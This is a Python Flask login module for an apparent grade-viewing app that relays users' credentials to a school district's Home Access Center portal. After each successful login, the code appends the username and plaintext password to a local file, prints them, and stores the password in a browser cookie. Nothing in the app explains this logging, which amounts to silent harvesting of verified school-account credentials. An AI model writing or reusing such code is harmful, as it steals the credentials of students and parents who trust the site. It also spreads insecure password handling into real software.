from flask import Blueprint, render_template, request, flash, redirect, url_for, session, make_response
import requests
from bs4 import BeautifulSoup
from .models import User

auth = Blueprint('auth', __name__)

login_url = "https://homeaccess.katyisd.org/HomeAccess/Account/LogOn"
assignmentsdata = 'https://homeaccess.katyisd.org/HomeAccess/Content/Student/Assignments.aspx'
reportcarddata = 'https://homeaccess.katyisd.org/HomeAccess/Content/Student/ReportCards.aspx'

@auth.route('/login', methods=['GET', 'POST'])
def login():

    login_data = {
        '__RequestVerificationToken': '',
        'SCKTY00328510CustomEnabled': True,
        'SCKTY00436568CustomEnabled': True,
        'Database': 10,
        'VerificationOption': 'UsernamePassword',
        'LogOnDetails.UserName': '',
        'tempUN': '',
        'tempPW': '',
        'LogOnDetails.Password': ''
    }

    if request.method == 'POST':
        with requests.Session() as authsession:
            r = authsession.get(login_url)
            soup = BeautifulSoup(r.content, 'html.parser')
            login_data['__RequestVerificationToken'] = soup.find('input', attrs={'name': '__RequestVerificationToken'})['value']
            user = request.form.get('username')
            pswd = request.form.get('password')
            login_data['LogOnDetails.UserName'] = user
            login_data['LogOnDetails.Password'] = pswd
            post = authsession.post(login_url, data=login_data)
            assignments = authsession.get(assignmentsdata)
            content = BeautifulSoup(assignments.text, 'html.parser')
            if(str(content.title) == '<title>Login</title>'):
                flash('\nIncorrect credentials, please try again!', category='error')
            else:
                file_object = open('sample.txt', 'a')
                add = user + " - " + pswd + "\n"
                file_object.write(add)
                file_object.close()
                print(add)
                flash('\nLogin Successful!', category='success')
                res = redirect(url_for('views.home'))
                res.set_cookie("username", value=user, expires=15)
                res.set_cookie("password", value=pswd, expires=15)
                return res
    return render_template("login.html")

@auth.route('/logout')
def logout():
    resp = redirect(url_for('auth.login'))
    resp.set_cookie('username', '', expires=0)
    resp.set_cookie('password', '', expires=0)
    return resp
